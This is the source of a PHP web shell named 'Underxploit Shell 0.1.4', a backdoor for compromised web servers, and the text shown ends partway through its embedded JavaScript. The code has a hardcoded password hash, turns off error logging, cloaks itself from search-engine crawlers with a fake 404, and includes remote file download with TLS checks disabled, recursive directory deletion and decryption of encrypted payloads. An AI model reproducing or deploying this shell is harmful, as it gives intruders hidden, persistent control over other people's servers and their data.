<?php
/*! Description & About
		* Underxploit Shell 0.1.4
		* Responsive Design
		* Source Editor With Line Number
		* Source Viewer With Syntax Highligter
		* Simple Alert
		* Without Log's
		* Clean Url
		* Fast Loading (Using Javascript Jump :v)
		* With Hacking Tools
		* Programmed By Wildan Izzudin
		* Web Shell (c) 2019
		* Fix On 29, Mar 2019 (Friday)
End !*/
error_reporting(0);
ob_start("ob_gzhandler");
// --- pass : root --- //
$pass = "63a9f0ea7bb98050796b649e85481845";
$_POST = cl($_POST); $_GET = cl($_GET);
$_COOKIE = cl($_COOKIE);
$_UNDERXPLOIT = array_merge($_POST, $_GET);
$_UNDERXPLOIT = array_map("xp", $_UNDERXPLOIT);
$cookie = md5($_SERVER['HTTP_USER_AGENT']);

switch (true) {
	case (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])])): 
		vb(md5($_SERVER['HTTP_HOST']) , $cookie);
}

function vb($k, $v) {
	$_COOKIE[$k] = $v;
		setcookie($k, $v);
}

function jmbt($str){
	return htmlspecialchars($str, 2 | 1);
}

function mtr($y) {
		print '<meta http-equiv="refresh" content="1;url=' . $y . '"/>';
	return $y;
}

function op($d, $e) {
	$fp = fopen($d, "w"); $ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $e);
	curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
	curl_setopt($ch, CURLOPT_FILE, $fp);
	return curl_exec($ch);
	curl_close($ch);
	fclose($fp);
	ob_flush();
	flush();
}

function perms($x_x) {
		if($x_cv = @fileperms($x_x)){
		$x_cz = 'u';
		if(($x_cv & 0xC000) == 0xC000)$x_cz = 's';
		elseif(($x_cv & 0xA000) == 0xA000)$x_cz = 'l';
		elseif(($x_cv & 0x8000) == 0x8000)$x_cz = '-';
		elseif(($x_cv & 0x6000) == 0x6000)$x_cz = 'b';
		elseif(($x_cv & 0x4000) == 0x4000)$x_cz = 'd';
		elseif(($x_cv & 0x2000) == 0x2000)$x_cz = 'c';
		elseif(($x_cv & 0x1000) == 0x1000)
        $x_cz = 'p';
		$x_cz .= ($x_cv & 00400)? 'r':'-';
		$x_cz .= ($x_cv & 00200)? 'w':'-';
		$x_cz .= ($x_cv & 00100)? 'x':'-';
		$x_cz .= ($x_cv & 00040)? 'r':'-';
		$x_cz .= ($x_cv & 00020)? 'w':'-';
		$x_cz .= ($x_cv & 00010)? 'x':'-';
		$x_cz .= ($x_cv & 00004)? 'r':'-';
		$x_cz .= ($x_cv & 00002)? 'w':'-';
		$x_cz .= ($x_cv & 00001)? 'x':'-';
		return $x_cz;
	}
	else return "- ?? -";
}

function deledir($str) {
switch (true) {
	case (is_dir($str)): $hnd = opendir($str);
switch (true) {
	case (!$hnd): return false;
break;
	default:
		while ($file = readdir($hnd)) {
switch (true) {
	case ($file != '.' && $file != '..'): switch (true) {
	case (!is_dir($str . "/" . $file)): unlink($str . "/" . $file);
break;
	default: deledir($str . '/' . $file);
	} break; }
}
	closedir($hnd); rmdir($str); return true;
break; } break; }
}

function a($str) {
	@define("x13", "\x31\x33\x33\x37", true);
	$x14 = base64_decode($str);
	$x16s = substr($x14, 0, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC));
	$x19 = rtrim(mcrypt_decrypt(MCRYPT_RIJNDAEL_128, hash('sha256', x13, true) , substr($x14, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC)) , MCRYPT_MODE_CBC, $x16s) , "\0");
	return $x19;
}

function x($b) {
	$c = a($b); return $c;
}

@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('html_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('file_uploads', 1);
@set_time_limit(0);
@clearstatcache();
@define("x5", "\x64\x69\x72\x3d", true);
@define("x7", "\x63\x6f\x6d\x6d\x61\x6e\x64\x3d", true);
@define("x6", "\x66\x69\x6c\x65\x3d", true);
@define("x9", "\x3c\x64\x69\x76\x20\x63\x6c\x61\x73\x73\x3d\x27\x63\x6f\x4c\x2d\x6f\x70\x74\x69\x6f\x6e\x20\x74\x6f\x70\x27\x3e\x3c\x62\x72\x3e\x3c\x62\x72\x3e\x3c\x62\x72\x3e\x3c\x63\x65\x6e\x74\x65\x72\x3e\x3c\x69\x20\x63\x6c\x61\x73\x73\x3d\x27\x7a\x6d\x64\x69\x20\x7a\x6d\x64\x69\x2d\x61\x6c\x65\x72\x74\x2d\x63\x69\x72\x63\x6c\x65\x2d\x6f\x20\x7a\x6d\x64\x69\x2d\x68\x63\x2d\x66\x77\x20\x7a\x6d\x64\x69\x2d\x68\x63\x2d\x34\x78\x27\x3e\x3c\x2f\x69\x3e\x3c\x62\x72\x3e\x3c\x62\x72\x3e\x5b\x20\x42\x41\x44\x20\x52\x45\x51\x55\x45\x53\x54\x20\x5d\x3c\x2f\x63\x65\x6e\x74\x65\x72\x3e\x3c\x62\x72\x3e\x3c\x62\x72\x3e\x3c\x62\x72\x3e\x3c\x62\x72\x3e\x3c\x2f\x64\x69\x76\x3e\x3c\x2f\x64\x69\x76\x3e", true);
@define("sec", $pass, true);

switch (true) {
	case ($_UNDERXPLOIT['dir']): $dir = str_replace("\\", "/", $_UNDERXPLOIT['dir']);
	@chdir($dir);
break;
	default: $dir = str_replace("\\", "/", getcwd());
}

$dir = str_replace("\\", "/", $dir);
$scdir = explode("/", $dir);

function cl($str) {
	$qos = strtolower(ini_get('magic_quotes_sybase'));
switch (true) {
	case (function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()):
	case (is_array($str)): foreach($str as $k => $v) {
switch (true) {
	case (is_array($v)): $str[$k] = cl($v);
break;
	default: $str[$k] = (empty($qos) || $qos === 'off') ? stripslashes($v) : stripslashes(str_replace("\'\'", "\'", $v));
		}
	} break; } return $str;
}

function xp($str) {
	return (is_array($str)) ? array_map("rawurldecode", $str) : rawurldecode($str);
}

function r($str) {
	print '<script type="text/javascript">window.location = "' . $str . '";</script>';
	return $str;
}

function s($str) {
	print 'notif({
				type: "default",
				msg: "<span class=\'alert\'><font color=\'#fff\'>' . $str . '</font>",
				width: "all",
				height: 100,
				position: "center",
			});';
	return $str;
}

function bacot($str) {
	print '<script type="text/javascript"> notif({
				type: "default",
				msg: "<span class=\'alert\'><font color=\'#fff\'>' . $str . '</font>",
				width: "all",
				height: 100,
				position: "center",
			});</script>';
	return $str;
}

switch(true) {
	case (get_magic_quotes_gpc()): function stripslashes_array($array) {
		return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);
	}
		$_UNDERXPLOIT = stripslashes_array($_UNDERXPLOIT);
		$_COOKIE = stripslashes_array($_COOKIE);
}

switch (true) {
	case (!empty(sec)): switch (true) {
	case (($_UNDERXPLOIT['pass']) && (md5($_UNDERXPLOIT['pass']) == sec)): vb(md5($_SERVER['HTTP_HOST']) , sec);
break;
	case (!$_COOKIE[md5($_SERVER['HTTP_HOST']) ]) || ($_COOKIE[md5($_SERVER['HTTP_HOST']) ] != sec): login();
break;
	}
}

function login() {
switch (true) {
	case (!empty($_SERVER['HTTP_USER_AGENT'])):
		$serp = array("Google","Slurp","MSNBot","ia_archiver","Yandex","Rambler","Yahoo","Bing");
	case (preg_match('/' . implode('|', $serp) . '/i', $_SERVER['HTTP_USER_AGENT'])):
		header('HTTP/1.0 404 Not Found');
}
	
die('<!DOCTYPE html>
<head>
    <title>LOGIN | UNDERXPLOIT SHELL 0.1.4</title>
    <meta name="robots" content="noindex, nofollow, noarchive">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta property="og:image" content="//1.bp.blogspot.com/-P1jMet8cGvQ/Wi6HjYT3n5I/AAAAAAAAAuQ/bO2cfdqUfJo8YPt0SP6veAvhEERf_SEzQCLcBGAs/s320/logo.jpg">
    <meta name="theme-color" content="#1D9D73">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="#1D9D73">
    <meta name="msapplication-navbutton-color" content="#1D9D73">
    <meta name="author" content="WILDAN IZZUDIN">
	<link href="//underxploit.github.io/core/favicon.ico" rel="icon" type="image/x-icon" />
	<link rel="stylesheet" href="//underxploit.github.io/core/icons/material.css" />
<script type="text/javascript">
        baseUrl = window.location.href.split("?")[0];
   	window.history.pushState("name", "?", baseUrl);
</script>
 <style>
 @import url(https://fonts.googleapis.com/css?family=Play);
* {
	box-sizing: border-box
}

*:focus {
	outline: 0
}

body {
	font-size: 14px;
	color: #fff;
	margin: auto;
	font-family: "Play";
	background: #212121
}

.login-container {
	max-width: 450px;
	margin: auto;
	overflow: auto;
	background: none
}

.login-kepala {
	background: #222;
	padding: 10px;
	color: #fff;
	font-size: 14px;
	position: fixed;
	z-index: 1024;
	top: 0;
	left: 0;
	right: 0;
	-o-border-radius: 2px;
	-webkit-box-shadow: 0 1px 4px 0 rgba(0, 0, 0, .14);
	-moz-box-shadow: 0 1px 4px 0 rgba(0, 0, 0, .14);
	-ms-box-shadow: 0 1px 4px 0 rgba(0, 0, 0, .14);
	-o-box-shadow: 0 1px 4px 0 rgba(0, 0, 0, .14);
	box-shadow: 0 1px 4px 0 rgba(0, 0, 0, .14);
	font-family: "Play"
}

input[type=password] {
	border: 0;
	border-bottom: 1px solid #1D9D73;
	padding: 9px;
	background: none;
	color: #fff;
	font-family: "Play";
	width: 100%;
	font-size: 14px
}

.btn-exe:hover {
	background: none;
	border: 1px solid #1D9D73;
	color: #1D9D73;
	-webkit-transition: all 0.3s;
	-moz-transition: all 0.3s;
	transition: all 0.3s
}

table {
	width: 100%
}

.btn-exe {
	background: #1D9D73;
	color: #fff;
	font-family: "Play";
	padding: 6px;
	border: 1px solid #1D9D73;
	width: 100%;
	font-size: 14px;
	border-top-right-radius: 15px;
	border-bottom-left-radius: 15px
}             
   	</style>
	</head>
<body>
    <div class="login-kepala">
        <div class="login-container">
            <form action="" method="post">
                <table>
                    <td align="center" style="width:10%">
                        <i class="zmdi zmdi-chevron-right"></i>
                    </td>
                    <td style="width:70%">
                        <input type="password" placeholder="" name="pass">
                    </td>
                    <td style="text-align:right;width:20%">
                        <button type="submit" class="btn-exe">
                            <i class="zmdi zmdi-long-arrow-return zmdi-hc-fw"></i>
                        </button>
                    </td>
                </table>
            </form>
        </div>
    </div>
</body>
</html>');
}

	print '<!DOCTYPE html lang="en">
<head>
    <title>UNDERXPLOIT SHELL 0.1.4</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="author" content="WILDAN IZZUDIN">
    <meta name="theme-color" content="#1D9D73">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="#1D9D73">
    <meta name="msapplication-navbutton-color" content="#1D9D73">
    <link rel="icon" href="//underxploit.github.io/core/favicon.ico" type="image/x-icon" />
	<link rel="stylesheet" href="//underxploit.github.io/core/icons/material.css" />
<style>
@import url(https://fonts.googleapis.com/css?family=Play);img[alt*="www.000webhost.com"]{display:none}*{box-sizing:border-box}*:focus{outline:0}::-moz-selection{background-color:rgba(201,223,255,.1);color:#fff}body{font-size:14px;background-attachment:fixed;color:#fff;margin:auto;font-family:"Play";background-color:#202020;overflow:auto;box-sizing:border-box}code{font-family:"Play";word-wrap:break-word;background:rgba(0,0,0,.2);font-size:13px}pre{margin:0;border:1px solid #343436;white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word;font-size:13px;background:#222}a{text-decoration:none;color:#fff}input[type=file]::-webkit-file-upload-button{background:#1D9D73;border:1px solid #1D9D73;color:#1D9D73;font-size:14px;font-family:"Play";border-radius:2px;width:1px}input[type=file]{border:1px solid #343436;color:#fff;background:#323232;width:100%;font-size:14px;padding:7px;border-radius:2px;font-family:"Play"}select{-webkit-appearance:none;-moz-appearance:none;text-indent:1px}input[type=number]{-moz-appearance:textfield}input[type=number]::-webkit-inner-spin-button,input[type=number]::-webkit-outer-spin-button{-webkit-appearance:none;-moz-appearance:none;appearance:none;margin:0}input[type=text],input[type=number],input[type=password]{border:1px solid #343436;padding:9px;background:#323232;color:#fff;font-family:"Play";width:100%;border-radius:2px;font-size:14px}textarea{border:1px solid rgba(255,255,255,.1);width:100%;height:600px;padding:5px;background:none;color:#fff;font-family:"Play";font-size:13px;border-radius:2px}select{padding:9px;border:1px solid #343436;font-family:"Play";font-size:14px;background:#323232;width:100%;color:#fff;border-radius:2px;-webkit-appearance:none}.btn-exe{background:#1D9D73;color:#fff;font-family:"Play";padding:9px;border:1px solid #1D9D73;width:100%;border-radius:2px;font-size:14px;-webkit-transition:all 0.3s;-moz-transition:all 0.3s;transition:all 0.3s}.btn-exe:hover{background:none;border:1px solid #1D9D73;color:#1D9D73}.lawb{position:relative;bottom:3px;background:#1D9D73;color:#fff;font-family:"Play";padding:3px 7px;border:1px solid #1D9D73;width:100%;border-radius:2px;font-size:13px;-webkit-transition:all 0.3s;-moz-transition:all 0.3s;transition:all 0.3s}.tup{font-size:14px}.alert{font-family:"Play";color:#fff}.coL{width:469px;border:0 solid #ddd;background:#222;padding:3px;float:left;margin-left:2px;margin-right:2px;margin-bottom:2px;margin-top:3px;color:#222}.tools-content{padding:3px;margin:1px 2px 0 2px;background:none;border-radius:2px;border:1px solid #343436}.td-tools-left{padding:5px;width:30px;text-align:center}.td-tools-icon{width:50px;background:none;text-align:center}.td-tools-content{padding-left:5px;font-size:14px}.label-danger{color:red}.label-success{color:#1D9D73}.coR{width:343px;border:0;background:#222;margin-left:2px;margin-right:2px;margin-bottom:2px;margin-top:3px;padding:3px;float:left}table{width:100%}hr{border:0;height:1px;background-image:-webkit-linear-gradient(left,#343436,#343436,#343436);background-image:-moz-linear-gradient(left,#343436,#343436,#343436);background-image:-ms-linear-gradient(left,#343436,#343436,#343436);background-image:-o-linear-gradient(left,#343436,#343436,#343436)}h2{font-size:19px;font-weight:400}.th-nav{width:85px}.co-ontainer-2{max-width:820px;margin:auto;overflow:hidden;background:#222;box-shadow:0 1px 5px rgba(27,31,35,.15)!important}.co-ontainer-3{max-width:820px;margin:auto;overflow:hidden;background:none}.coL-panel{padding:1px;border:1px solid #343436;border-bottom:0;color:#fff;border-radius:2px;margin:2px;margin-bottom:0;background:none}.coR-panel{padding:1px;border:1px solid #343436;border-bottom:0;color:#fff;margin:2px;border-radius:2px;background:none}.main-content{padding:5px;margin-top:5px;background:none;border:0 solid #ddd;font-size:16px}.ex-hov:hover{background:rgba(52,52,63,.2);-webkit-transition:all 0.3s;-moz-transition:all 0.3s;transition:all 0.3s}.dir{background:#343436;padding:2px;margin-left:2px;margin-right:2px;margin-top:3px;margin-bottom:1px;font-size:15px}.dir-pallet{background:rgba(255,255,255,.1);padding:6px;text-align:left}.dir-td-left{width:50px;border-right:1px solid #1D9D73;font-size:14px}.dir-td-right{padding-left:5px;font-size:15px}@media screen and (max-width:2024px){select{padding:8px}#wh{display:display}.co-ontainer-2{width:100%;border-radius:0}.coL{width:467px;background:none:margin-bottom:3px;border:none}.coR{width:42%;float:right;border:none}}@media screen and (max-width:1024px){select{padding:8px}#wh{display:display}.co-ontainer-2{width:100%;border-radius:0}.coL{width:467px;background:none:margin-bottom:3px;border:none}.coR{width:42%;float:right;border:none}}@media screen and (max-width:780px){select{padding:9px}#wh{display:none}.co-ontainer-2{background:#222;border-radius:0;margin-top:0}.coL{padding:1px;width:auto;float:none}.coR{padding:1px;width:auto;float:none}}.footer{background:#343436;color:#fff;padding:8px;text-align:center;margin:auto;overflow:hidden;max-width:820px;-webkit-box-shadow:0 1px 4px 0 rgba(0,0,0,.14);-moz-box-shadow:0 1px 4px 0 rgba(0,0,0,.14);-ms-box-shadow:0 1px 4px 0 rgba(0,0,0,.14);-o-box-shadow:0 1px 4px 0 rgba(0,0,0,.14);box-shadow:0 1px 4px 0 rgba(0,0,0,.14)}.td-panel{border-right:1px solid #343436;padding:5px;padding-right:8px;width:40px;text-align:center;color:#fff}.td-panel-right{padding-left:3px;font-size:14px}.a:hover{color:#1D9D73;-webkit-transition:all 0.3s;-moz-transition:all 0.3s;transition:all 0.3s}.coL-option{padding:5px;border:1px solid #343436;margin:2px 2px 0 2px;background:none;font-size:13px;border-radius:2px;color:#fff}.coL-option td{font-size:14px}.coL-btn-option-active{padding:7px;background:none;border:0 solid rgba(255,255,255,.1);font-size:14px;font-family:"Play";width:100%;color:#fff}.coL-btn-option{padding:7px;background:#343436;border:1px solid #343436;font-size:14px;border-radius:2px;font-family:"Play";width:100%;color:#fff;-webkit-transition:all 0.3s;-moz-transition:all 0.3s;transition:all 0.3s}.coL-btn-option:hover{background:none;width:100%;color:#fff;border:1px solid #343436}.coL-option-panel{padding:5px;border:none;background:#343436;font-size:14px}.xa{background:#1D9D73;color:#fff;width:30px;height:30px;padding:5px;border:none;-webkit-transition:all 0.3s;-moz-transition:all 0.3s;transition:all 0.3s;border-radius:100%}.xa:hover{background:#343436;color:#1D9D73}.table-info{margin-top:3px;border-collapse:collapse;font-family:"Play"}.th-info{padding:6px;border:1px solid #343436;background:#343436;border-collapse:collapse;font-family:"Play";font-weight:400;color:#fff;font-size:14px}.td-info{padding:7px;border:1px solid #343436;background:none;font-family:"Play";font-size:14px}.table-file{margin-top:3px;font-family:"Play";padding-right:2px;padding-left:2px}.table-file tr:hover{background:rgba(52,52,63,.2);-webkit-transition:all 0.3s;-moz-transition:all 0.3s;transition:all 0.3s}.th-file{padding:6px;border:1px solid #343436;background:#343436;font-family:"Play";font-weight:400;font-size:14px;color:#fff}.td-file{font-size:14.3px;padding:4px;border:0;border-bottom:1px dashed #343436;background:none;font-family:"Play" color:#222}.wr{padding:10px 5px 10px 5px}.loader{border:2px solid #343436;border-radius:50%;border-top:2px solid #1D9D73;width:20px;height:20px;-webkit-animation:spin 600ms linear infinite;animation:spin 600ms linear infinite}@-webkit-keyframes spin{0%{-webkit-transform:rotate(0deg)}100%{-webkit-transform:rotate(360deg)}}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}#judul{text-transform:uppercase;float:left;margin-top:8px;font-weight:700;display:none}.atas{background:fixed;background-size:cover;text-align:center;padding:0;background-color:#222}@media screen and (max-width:2024px){select{padding:8px}#particles-js{height:300px}}@media screen and (max-width:1024px){select{padding:8px}#particles-js{height:300px}}@media screen and (max-width:780px){select{padding:9px}#particles-js{height:200px}}#particles-js{max-width:820px}input[type=checkbox]{display:none}.icon{text-align:center;display:inline-block}.icon .zmdi{visibility:hidden}input[type=checkbox]:checked + .icon .zmdi{position:relative;top:1px;right:1px;visibility:visible}input[type=checkbox]{display:inline\9}.icon{display:none\9}input[type=checkbox]{margin:0 .1em}.icon{background:none;border:1px solid #343436;border-radius:100px;text-align:center;font-size:15px;margin:2px auto 2px auto;height:20px;width:20px;line-height:2000px}.move-top{color:#fff;border-radius:3px;position:fixed;bottom:10px;right:10px;text-decoration:none;padding:15px 25px 15px 20px;display:none;background:rgba(0,0,0,.4)}.animated{-webkit-animation-duration:1s;animation-duration:1s;-webkit-animation-fill-mode:both;animation-fill-mode:both}.animated.infinite{-webkit-animation-iteration-count:infinite;animation-iteration-count:infinite}@-webkit-keyframes flash{from,50%,to{opacity:1}25%,75%{opacity:0}}@keyframes flash{from,50%,to{opacity:1}25%,75%{opacity:0}}.flash{-webkit-animation-name:flash;animation-name:flash}@-webkit-keyframes rubberBand{from{-webkit-transform:scale3d(1,1,1);transform:scale3d(1,1,1)}30%{-webkit-transform:scale3d(1.25,.75,1);transform:scale3d(1.25,.75,1)}40%{-webkit-transform:scale3d(.75,1.25,1);transform:scale3d(.75,1.25,1)}50%{-webkit-transform:scale3d(1.15,.85,1);transform:scale3d(1.15,.85,1)}65%{-webkit-transform:scale3d(.95,1.05,1);transform:scale3d(.95,1.05,1)}75%{-webkit-transform:scale3d(1.05,.95,1);transform:scale3d(1.05,.95,1)}to{-webkit-transform:scale3d(1,1,1);transform:scale3d(1,1,1)}}@keyframes rubberBand{from{-webkit-transform:scale3d(1,1,1);transform:scale3d(1,1,1)}30%{-webkit-transform:scale3d(1.25,.75,1);transform:scale3d(1.25,.75,1)}40%{-webkit-transform:scale3d(.75,1.25,1);transform:scale3d(.75,1.25,1)}50%{-webkit-transform:scale3d(1.15,.85,1);transform:scale3d(1.15,.85,1)}65%{-webkit-transform:scale3d(.95,1.05,1);transform:scale3d(.95,1.05,1)}75%{-webkit-transform:scale3d(1.05,.95,1);transform:scale3d(1.05,.95,1)}to{-webkit-transform:scale3d(1,1,1);transform:scale3d(1,1,1)}}.rubberBand{-webkit-animation-name:rubberBand;animation-name:rubberBand}.menus{padding:8px;text-align:right;background:none}.atas-ae{position:fixed;top:0;right:0;left:0;z-index:1030;padding:10px;margin:auto;max-width:820px}.top{margin-top:3px}.elip{max-width:100px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.wrap{word-wrap:break-word}.break{word-break:break-all;white-space:normal}#ui_notifIt{position:fixed;top:10px;right:10px;left:10px;cursor:none;overflow:hidden;-webkit-box-shadow:0 3px 5px rgba(0,0,0,.3);-moz-box-shadow:0 3px 5px rgba(0,0,0,.3);-o-box-shadow:0 3px 5px rgba(0,0,0,.3);box-shadow:0 3px 5px rgba(0,0,0,.3);-wekbit-border-radius:5px;-moz-border-radius:5px;-o-border-radius:5px;border-radius:5px;z-index:2000}#ui_notifIt:hover{opacity:1!important}#ui_notifIt p{text-align:center;font-family:sans-serif;font-size:14px;padding:0;margin:0}#notifIt_close{position:absolute;color:#FFF;top:0;padding:0 5px;right:0}#notifIt_close:hover{background-color:rgba(255,255,255,.3)}#ui_notifIt.default{background-color:#1D9D73;border:0;-webkit-box-shadow:0 1px 4px 0 rgba(0,0,0,.14);-moz-box-shadow:0 1px 4px 0 rgba(0,0,0,.14);-ms-box-shadow:0 1px 4px 0 rgba(0,0,0,.14);-o-box-shadow:0 1px 4px 0 rgba(0,0,0,.14);box-shadow:0 1px 4px 0 rgba(0,0,0,.14)}.notifit_confirm_bg,.notifit_prompt_bg{position:fixed;top:0;left:0;height:100%;width:100%;background-color:rgba(255,255,255,.1)}.notifit_confirm *,.notifit_prompt *{font-family:"Play"}.notifit_confirm,.notifit_prompt{position:fixed;top:0;left:0;padding:30px 30px 0 30px;background-color:#1D9D73;border:1px solid rgba(0,0,0,.1);-webkit-border-radius:5px;-moz-border-radius:5px;-ms-border-radius:5px;-o-border-radius:5px;border-radius:5px;-webkit-box-shadow:0 2px 10px rgba(0,0,0,.2);box-shadow:0 2px 10px rgba(0,0,0,.2)}.hljs{display:block;overflow-x:auto;font-size:13px;padding:.5em;background:#222;color:#e6e1dc}.hljs-comment,.hljs-quote{color:#bc9458;font-style:italic}.hljs-keyword,.hljs-selector-tag{color:#c26230}.hljs-string,.hljs-number,.hljs-regexp,.hljs-variable,.hljs-template-variable{color:#1D9D73}.hljs-subst{color:#519f50}.hljs-tag,.hljs-name{color:#e8bf6a}.hljs-type{color:#da4939}.hljs-symbol,.hljs-bullet,.hljs-built_in,.hljs-builtin-name,.hljs-attr,.hljs-link{color:#6d9cbe}.hljs-params{color:#d0d0ff}.hljs-attribute{color:#cda869}.hljs-meta{color:#9b859d}.hljs-title,.hljs-section{color:#ffc66d}.hljs-addition{background-color:#144212;color:#e6e1dc;display:inline-block;width:100%}.hljs-deletion{background-color:#600;color:#e6e1dc;display:inline-block;width:100%}.hljs-selector-class{color:#9b703f}.hljs-selector-id{color:#8b98ab}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}::selection{background-color:#1D9D73;color:#fff}.linedwrap{border:1px solid #343436;padding:3px;padding-right:0;margin-top:5px}#paksa{padding:0 2px 0 2px}.linedtextarea{padding:0;margin:0}.linedtextarea,.linedwrap .codelines .lineno{font-size:13px;font-family:"Play";line-height:normal!important}.linedwrap .lines{margin-top:1px;width:45px;float:left;overflow:hidden;border-right:1px solid #1D9D73;margin-right:5px}.linedwrap .codelines{padding-top:6px}.linedwrap .codelines .lineno{color:#AAA;padding-right:5px;padding-top:0em;text-align:right;white-space:nowrap;font-family:"Play"}.linedwrap .codelines .lineselect{color:#1D9D73}.tool-container,.tool-item,.btn-toolbar{-webkit-box-sizing:content-box;-moz-box-sizing:content-box;box-sizing:content-box}.btn-toolbar{background:#1D9D73;width:20px;height:20px;text-align:center;padding:7px;border-radius:4px;display:block;transition:none}.btn-toolbar>i{color:#02baf2;font-size:16px}.btn-toolbar:hover{background:#02baf2;cursor:pointer}.btn-toolbar:hover>i{color:white}.btn-toolbar-dark{background-color:#1D9D73}.btn-toolbar-dark.pressed{background-color:#5e696d}.btn-toolbar-dark:hover{background-color:#5e696d}.btn-toolbar-dark>i{color:white}.tool-container{background-color:#5e696d;background-size:100% 100%;border-radius:4px;position:absolute}.tool-container.tool-top,.tool-container.tool-bottom{height:34px;border-bottom:0 solid #beb8b8}.tool-container.tool-top .tool-item,.tool-container.tool-bottom .tool-item{float:left;border-right:0;border-left:0}.tool-item{height:100%;display:block;width:20px;height:20px;text-align:center;padding:7px;transition:none}.tool-item>.zmdi{color:#b2c6cd;font-size:15px;margin-top:3px}.tool-item.selected,.tool-item:hover{background:#02baf2}.tool-item.selected>.zmdi,.tool-item:hover>.zmdi{color:white}.tool-top .tool-item:first-child:hover,.tool-bottom .tool-item:first-child:hover{border-top-left-radius:4px;border-bottom-left-radius:4px}.tool-top .tool-item:last-child:hover,.tool-bottom .tool-item:last-child:hover{border-top-right-radius:4px;border-bottom-right-radius:4px}.tool-vertical-top .tool-item:first-child:hover,.tool-vertical-bottom .tool-item:first-child:hover,.tool-right .tool-item:first-child:hover,.tool-left .tool-item:first-child:hover{border-top-left-radius:4px;border-top-right-radius:4px}.tool-vertical-top .tool-item:last-child:hover,.tool-vertical-bottom .tool-item:last-child:hover,.tool-right .tool-item:last-child:hover,.tool-left .tool-item:last-child:hover{border-bottom-left-radius:4px;border-bottom-right-radius:4px}.tool-container .arrow{width:0;height:0;position:absolute;border-width:7px;border-style:solid}.tool-container.tool-top .arrow{border-color:#5e696d transparent transparent;left:50%;bottom:-14px;margin-left:-7px}.tool-container.tool-bottom .arrow{border-color:transparent transparent #5e696d;left:50%;top:-14px;margin-left:-7px}.tool-container.tool-left .arrow{border-color:transparent transparent transparent #5e696d;top:50%;right:-14px;margin-top:-7px}.tool-container.tool-right .arrow{border-color:transparent #5e696d transparent transparent;top:50%;left:-14px;margin-top:-7px}.toolbar-dark{background-color:#1D9D73}.toolbar-dark.tool-top .arrow{border-color:#1D9D73 transparent transparent}.toolbar-dark.tool-bottom .arrow{border-color:transparent transparent #1D9D73}.toolbar-dark.tool-left .arrow{border-color:transparent transparent transparent #1D9D73}.toolbar-dark.tool-right .arrow{border-color:transparent #1D9D73 transparent transparent}.toolbar-dark .tool-item>.zmdi{color:white}.toolbar-dark .tool-item.selected,.toolbar-dark .tool-item:hover{background:#343436;color:white}.animate-standard{-webkit-animation:standardAnimate 0.3s 1 ease}.animate-flyin{-webkit-animation:rotateAnimate 0.5s 1 ease}.animate-grow{-webkit-animation:growAnimate 0.4s 1 ease}.animate-flip{-webkit-animation:flipAnimate 0.4s 1 ease}.animate-bounce{-webkit-animation:bounceAnimate 0.4s 1 ease-out}@-webkit-keyframes rotateAnimate{from{transform:rotate(180deg) translate(-120px);opacity:0}to{transform:rotate(0deg) translate(0);opacity:1}}@-webkit-keyframes standardAnimate{from{transform:translateY(20px);opacity:0}to{transform:translateY(0);opacity:1}}@-webkit-keyframes growAnimate{0%{transform:scale(0) translateY(40px);opacity:0}70%{transform:scale(1.5) translate(0)}100%{transform:scale(1) translate(0);opacity:1}}@-webkit-keyframes rotate2Animate{from{transform:rotate(-90deg);transform-origin:0% 100%;opacity:0}to{transform:rotate(0deg);opacity:1}}@-webkit-keyframes flipAnimate{from{transform:rotate3d(2,2,2,180deg);opacity:0}to{transform:rotate3d(0,0,0,0deg);opacity:1}}@-webkit-keyframes bounceAnimate{0%{transform:translateY(40px);opacity:0}30%{transform:translateY(-40px)}70%{transform:translateY(20px)}100%{transform:translateY(0);opacity:1}}.hidden{display:none}
</style>

	<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.js"></script>
    <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
	<script type="text/javascript">    	
if ( typeof Object.create !== \'function\' ) {
    Object.create = function( obj ) {
        function F() {}
        F.prototype = obj;
        return new F();
    };
}

(function( $, window, document, undefined ) {

    var ToolBar = {
        init: function( options, elem ) {
            var self = this;
            self.elem = elem;
            self.$elem = $( elem );
            self.options = $.extend( {}, $.fn.toolbar.options, options );
            self.metadata = self.$elem.data();
            self.overrideOptions();
            self.toolbar = $(\'<div class="tool-container" />\')
                .addClass(\'tool-\'+self.options.position)
                .addClass(\'toolbar-\'+self.options.style)
                .append(\'<div class="tool-items" />\')
                .append(\'<div class="arrow" />\')
                .appendTo(\'body\')
                .css(\'opacity\', 0)
                .hide();
            self.toolbar_arrow = self.toolbar.find(\'.arrow\');
            self.initializeToolbar();
        },

        overrideOptions: function() {
            var self = this;
            $.each( self.options, function( $option ) {
                if (typeof(self.$elem.data(\'toolbar-\'+$option)) != "undefined") {
                    self.options[$option] = self.$elem.data(\'toolbar-\'+$option);
                }
            });
        },

        initializeToolbar: function() {
            var self = this;
            self.populateContent();
            self.setTrigger();
            self.toolbarWidth = self.toolbar.width();
        },

        setTrigger: function() {
            var self = this;

            if (self.options.event != \'click\') {

                var moveTime;
                function decideTimeout () {
